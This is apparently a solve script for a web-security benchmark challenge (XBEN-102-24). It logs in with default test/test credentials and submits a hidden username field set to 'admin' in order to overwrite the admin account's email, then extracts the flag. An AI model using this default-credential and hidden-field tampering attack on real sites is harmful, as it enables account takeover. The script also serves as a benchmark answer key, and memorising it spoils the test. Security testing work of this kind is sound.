#!/usr/bin/env bash
# XBEN-102-24 — "Email updates" (tags: default_credentials, business_logic)
#
# `/profile` reads the email to *display* from `session['username']`, and then
# takes the username to *write* from the submitted form. The page never shows
# that field, which is why it looks like it is not there.
#
# Log in with the demo account and name `admin` as the row to update.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben102-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/login' \
    --set 'form.username=test' --set 'form.password=test' \
    --session "$SESSION" >/dev/null
seq="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/profile' \
    --set 'form.email=attacker@example.com' --set 'form.username=admin' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
